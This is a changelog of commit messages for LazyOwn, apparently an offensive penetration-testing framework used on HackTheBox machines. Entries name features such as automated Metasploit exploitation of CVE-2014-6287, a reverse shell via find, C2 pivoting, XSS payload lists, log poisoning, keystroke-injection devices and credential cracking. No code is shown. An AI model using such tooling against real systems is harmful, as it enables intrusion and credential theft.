  *   * feat(t): t \n\n Version: vvvrelease/0.1.2 \n\n t \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:56:31 2024 -0300 \n\n Hora: 1729562191


### Nuevas características

### Otros

  *   * feat(tes): tes \n\n Version: patch..1 \n\n tes \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:55:30 2024 -0300 \n\n Hora: 1729562130


### Nuevas características

### Otros

  *   * feat(t): t \n\n Version: patch..1 \n\n t \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:54:49 2024 -0300 \n\n Hora: 1729562089


### Nuevas características

### Otros

  *   * feat(t): t \n\n Version: vvvrelease/0.1.1 \n\n t \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:52:52 2024 -0300 \n\n Hora: 1729561972


### Nuevo Release

### Otros

  *   * release(tes): tes \n\n Version: vvvrelease/0.0.0 \n\n tes \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:51:56 2024 -0300 \n\n Hora: 1729561916


### Nuevas características

### Otros

  *   * feat(test): test \n\n Version: patch..1 \n\n test \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:47:28 2024 -0300 \n\n Hora: 1729561648


### Correcciones

### Otros

  *   * fix(test): test \n\n Version:  \n\n test \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:33:51 2024 -0300 \n\n Hora: 1729560831


### Nuevo parche

### Otros

  *   * patch(test): test \n\n Version: vvvrelease/0.1.0 \n\n test \n\n Modified file(s):\n- CHANGELOG.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:25:26 2024 -0300 \n\n Hora: 1729560326


### Nuevo Release

### Otros

  *   * release(tes): tes \n\n Version: vvvrelease/0.0.0 \n\n tes \n\n Modified file(s):\n- CHANGELOG.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:23:17 2024 -0300 \n\n Hora: 1729560197


### Nuevo Release

### Otros

  *   * release(test): test \n\n Version: vvvrelease/0.0.0 \n\n test \n\n Modified file(s):\n- CHANGELOG.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:12:57 2024 -0300 \n\n Hora: 1729559577


### Nuevo Release

### Otros

  *   * release(release): test \n\n Version: vvrelease/0.0.0 \n\n test \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:01:58 2024 -0300 \n\n Hora: 1729558918


### Otros

### Otros

  *   * release: test\n\nVersion: vrelease/0.0.0\n\ntest\n\nModified file(s):\n- CHANGELOG.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - version.json\nLazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429\nLazyOwn: https://grisuno.github.io/LazyOwn/\n\n\nFecha: lun 21 oct 2024 22:01:58 -03\n


### Nuevo Release

### Otros

  *   * release(test): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- CHANGELOG.md - DEPLOY.sh - README.md - docs/CHANGELOG.html - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:57:05 2024 -0300 \n\n Hora: 1729558625


### Nuevo Release

### Otros

  *   * release(test): test \n\n Version: release/0.0.0 \n\n release \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:50:52 2024 -0300 \n\n Hora: 1729558252


### Nuevo Release

### Otros

  *   * release(test): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:45:43 2024 -0300 \n\n Hora: 1729557943


### Nuevo parche

### Otros

  *   * patch(test): test \n\n Version: release/0.1.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:44:32 2024 -0300 \n\n Hora: 1729557872


### Nuevo Release

### Otros

  *   * release(release): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:44:02 2024 -0300 \n\n Hora: 1729557842


### Nuevo parche

### Otros

  *   * patch(test): test \n\n Version: release/0.1.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:43:41 2024 -0300 \n\n Hora: 1729557821


### Nuevo parche

### Otros

  *   * patch(test): test \n\n Version: release/0.1.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:43:22 2024 -0300 \n\n Hora: 1729557802


### Nuevo Release

### Otros

  *   * release(release): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:41:14 2024 -0300 \n\n Hora: 1729557674


### Nuevo Release

### Otros

  *   * release(release): release \n\n Version: release/0.0.0 \n\n release \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:40:50 2024 -0300 \n\n Hora: 1729557650


### Nuevo Release

### Otros

  *   * release(release test): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:39:11 2024 -0300 \n\n Hora: 1729557551


### Nuevo parche

### Otros

  *   * patch(patch): creating new tag \n\n Version: release/0.1.0 \n\n and new release \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:38:41 2024 -0300 \n\n Hora: 1729557521


### Nuevo parche

### Otros

  *   * patch(patch): new library \n\n Version: release/0.1.0 \n\n cmd2 \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:37:55 2024 -0300 \n\n Hora: 1729557475


### Correcciones

### Otros

  *   * fix(new version): new release \n\n Version: release/0.0.1 \n\n now on cmd2 \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:35:57 2024 -0300 \n\n Hora: 1729557357


### Nuevo Release

### Otros

  *   * release(release): migration from cmd to cmd2 \n\n Version: release/0.0.0 \n\n Not fully tested yet but... here go... \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/duckdns.sh - modules/lazyrtpflood.sh - modules/lazywps.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 20:31:30 2024 -0300 \n\n Hora: 1729553490


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.1.66 \n\n test \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 20 21:05:18 2024 -0300 \n\n Hora: 1729469118


### Otros

### Otros

  *   * feature(feat): openredirex, feroxbuster, gowitness, odat \n\n Version: release/0.1.66 \n\n all documented at COMMANDS.md and new channel https://odysee.com/@KillerMonkyRecordz:d \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 20 00:47:36 2024 -0300 \n\n Hora: 1729396056


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.1.65 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload1.json\nDeleted file(s):\n- payload1.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 19 18:24:04 2024 -0300 \n\n Hora: 1729373044


### Nuevas características

### Otros

  *   * feat(feat): monteverde machine \n\n Version: release/0.1.65 \n\n ad_getpass, some refactors. \n\n Modified file(s):\n- COMMANDS.md - Invoke-PowerShellTcp.ps1 - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - modules/credentials.json - payload.json - sessions/download_resources.sh\nDeleted file(s):\n- Invoke-PowerShellTcp.ps1\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 19 01:10:29 2024 -0300 \n\n Hora: 1729311029


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.1.64 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 19 00:18:05 2024 -0300 \n\n Hora: 1729307885


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.1.64 \n\n test \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - firefox.dmp - lazyown - utils.py\nDeleted file(s):\n- firefox.dmp\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 18 01:37:16 2024 -0300 \n\n Hora: 1729226236


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.1.64 \n\n image banner responsive \n\n Modified file(s):\n- README.md - banner.py - docs/README.html - docs/index.html - docs/index.html.bak - firefox.dmp\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 18 01:30:10 2024 -0300 \n\n Hora: 1729225810


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.1.64 \n\n test \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 17 23:48:09 2024 -0300 \n\n Hora: 1729219689


### Otros

### Otros

  *   * feature(feat): new commands documented at COMMANDS.md \n\n Version: release/0.1.64 \n\n xsstrike, breacher, parth, blazy, loxs, crack_cisco_7_password,  and new banner in colors ;) and options --old-banner to see the old banner \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/download_resources.sh - sessions/users.txt - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 23:55:33 2024 -0300 \n\n Hora: 1729047333


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.1.63 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 21:48:53 2024 -0300 \n\n Hora: 1729039733


### Pruebas

### Otros

  *   * test(test): no test \n\n Version: release/0.1.63 \n\n testing \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 21:39:48 2024 -0300 \n\n Hora: 1729039188


### Pruebas

### Otros

  *   * test(test): test \n\n Version: release/0.1.63 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/download_resources.sh - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 02:57:20 2024 -0300 \n\n Hora: 1728971840


### Pruebas

### Otros

  *   * test(test): deply \n\n Version: release/0.1.63 \n\n new \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 02:52:56 2024 -0300 \n\n Hora: 1728971576


### Pruebas

### Otros

  *   * test(test): deploy \n\n Version: release/0.1.63 \n\n  \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/users.txt - sessions/win/LazyOwnEvilWMI.ps1 - sessions/win/lazycat.ps1\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 14 07:50:57 2024 -0300 \n\n Hora: 1728903057


### Refactorización

### Otros

  *   * refactor(refactor): hashs \n\n Version: release/0.1.63 \n\n new logic of get hash similar to credentials \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 14 04:27:17 2024 -0300 \n\n Hora: 1728890837


### Otros

### Otros

  *   * feature(feat): new commands documented at COMMANDS.md \n\n Version: release/0.1.63 \n\n ip2hex, keepass, john2keepass \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - install.sh - lazyown - payload.json - sessions/win/LazyOwnEvilWMI.ps1 - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 13 01:52:12 2024 -0300 \n\n Hora: 1728795132


### Otros

### Otros

  *   * feature(feat): new commands like emp3r0r, template_helper_serializer, gospherus, wpscan, createjsonmachine_batch this is so important, is for monetize your skills with hackerone.com \n\n Version: release/0.1.62 \n\n all commands documented at COMMANDS.md, to use createjsonmachine_batch you need download csv from hackerone of the opportunnity campaign, in scope click in Download CSV, you download in sessions directory of lazyown and the command createjsonmachine_batch will do the magic! \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 12 04:07:36 2024 -0300 \n\n Hora: 1728716856


### Refactorización

### Otros

  *   * refactor(refactor): refactor of users.txt \n\n Version: release/0.1.61 \n\n now you can choice the users dic do you watn to use, and refactor whole users.txt hardcoded, celebrate with the add of username_anarchy t00l c0mmand add to COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 12 02:17:48 2024 -0300 \n\n Hora: 1728710268


### Refactorización

### Otros

  *   * refactor(refactor): refactor lazy_ruberdigispark isnto duckyspark \n\n Version: release/0.1.61 \n\n command documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/digispark.ino - payload.json - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 11 03:20:10 2024 -0300 \n\n Hora: 1728627610


### Documentación

### Otros

  *   * docs(docs): trasnlated nmap script \n\n Version: release/0.1.61 \n\n and add new feature vuln searchs \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 11 03:19:10 2024 -0300 \n\n Hora: 1728627550


### Refactorización

### Otros

  *   * refactor(refactor): nmap \n\n Version: release/0.1.61 \n\n nmap script was refactored, translated, and new feature, vulnerability search with nmap \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - modules/lazynmap.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 11 00:52:41 2024 -0300 \n\n Hora: 1728618761


### Otros

### Otros

  *   * Update README.md


### Nuevas características

### Otros

  *   * feat(feat): New Feature Automate Arduino Attacks or AAA the command is lazy_ducky_digispark \n\n Version: release/0.1.61 \n\n documented at COMMANDS.md and README.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 10 18:41:59 2024 -0300 \n\n Hora: 1728596519


### Nuevas características

### Otros

  *   * feat(feat): finger_user_enum \n\n Version: release/0.1.60 \n\n new functionality documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/credentials.json - payload.json - payload_poison.htb.json\nDeleted file(s):\n- payload_poison.htb.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 9 20:51:25 2024 -0300 \n\n Hora: 1728517885


### Nuevas características

### Otros

  *   * feat(feat): trasnform \n\n Version: release/0.1.59 \n\n command documented at COMMANDS.md like transform \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 9 02:40:41 2024 -0300 \n\n Hora: 1728452441


### Correcciones

### Otros

  *   * fix(fix): bug fixing \n\n Version: release/0.1.58 \n\n int the dunction do_ssh credentials are capture exception \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 8 18:37:32 2024 -0300 \n\n Hora: 1728423452


### Correcciones

### Otros

  *   * fix(fix): tags \n\n Version: release/0.1.57 \n\n xd \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 8 18:36:20 2024 -0300 \n\n Hora: 1728423380


### Refactorización

### Otros

  *   * refactor(refactor): refactor de find y nc \n\n Version: release/0.1.56 \n\n nuevos payloads en fidn y el comando nc ahora aguanta el parametro file que permite escuchar por archivos no solo por terminales \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 8 02:16:54 2024 -0300 \n\n Hora: 1728364614


### Otros

### Otros

  *   * feature(feature & refactor): new commands and refactor \n\n Version: release/0.1.56 \n\n new commands documented at COMMANDS.md : createjsonmachine, xss, arjun,  and refactor of lazylogpoisoning and C2 PORT FORWARDING ;) to pivoting \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - modules/XssPayloads.txt - modules/admin_panels.txt - modules/lazyc2.py - modules/lazylogpoisoning.py - modules/templates/index.html - payload.json - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 6 21:49:45 2024 -0300 \n\n Hora: 1728262185


### Nuevas características

### Otros

  *   * feat(feat): automsf \n\n Version: release/0.1.55 \n\n new command documented at COMMAND.md AUTOMSF using a payload run an automated attack \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 6 03:25:28 2024 -0300 \n\n Hora: 1728195928


### Pruebas

### Otros

  *   * test(new machine return): is a nice machine :P \n\n Version: release/0.1.54 \n\n to go sleep nice :P \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 6 02:19:22 2024 -0300 \n\n Hora: 1728191962


### Pruebas

### Otros

  *   * test(test): new machine yummy.htb found a command in find to reverse shell :P \n\n Version: release/0.1.54 \n\n please subs! https://www.youtube.com/@KillerMonkyRecordz \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/lazylynis.sh - payload.json - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 5 13:02:03 2024 -0300 \n\n Hora: 1728144123


### Nuevas características

### Otros

  *   * feat(feat): new attack mfscosole automated \n\n Version: release/0.1.54 \n\n httpFileServer version 2.3 CVE-2014-6287 exploit/windows/http/rejetto_hfs_exec command with the same name rejetto_hfs_exec documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 5 01:44:12 2024 -0300 \n\n Hora: 1728103452


### Pruebas

### Otros

  *   * test(test): testing DEPLOY.sh script \n\n Version: release/0.1.53 \n\n to youtube :D https://www.youtube.com/@KillerMonkyRecordz please subs!! \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 5 01:41:25 2024 -0300 \n\n Hora: 1728103285


### Documentación

### Otros

  *   * docs(docs): nueva documentacion comando evidence \n\n Version: release/0.1.53 \n\n ahroa en ingles y mas detallado \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 5 01:18:45 2024 -0300 \n\n Hora: 1728101925


### Pruebas

### Otros

  *   * test(test): lazyown infinite glitch storage \n\n Version: release/0.1.53 \n\n works like a charm :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 4 01:33:06 2024 -0300 \n\n Hora: 1728016386


### Correcciones

### Otros

